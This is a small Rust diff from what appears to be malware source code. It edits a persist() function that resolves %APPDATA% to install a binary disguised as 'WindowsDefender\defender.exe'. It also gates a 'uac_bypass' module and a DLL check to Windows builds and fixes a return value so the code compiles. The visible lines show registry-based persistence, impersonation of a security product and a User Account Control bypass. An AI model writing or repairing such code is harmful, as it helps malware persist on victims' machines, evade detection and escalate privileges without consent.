@@ -1,3 +1,4 @@
+#[cfg(target_os = "windows")]
 mod is_dll;
 use winreg::enums::{*};
 use winreg::RegKey;
@@ -6,6 +7,7 @@ use std::path::{Path, PathBuf};
 use std::env;
 use std::fs;
 use std::process;
+#[cfg(target_os = "windows")]
 use crate::uac_bypass;
 /// Target subpath inside APPDATA
 const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";
@@ -15,7 +17,7 @@ const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";
 pub fn persist() -> std::io::Result<()> {
     // Resolve %APPDATA%
     if is_dll::is_dll(){
-        return Ok((0));
+        return Ok(())
     }
     let appdata = env::var("APPDATA")
         .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
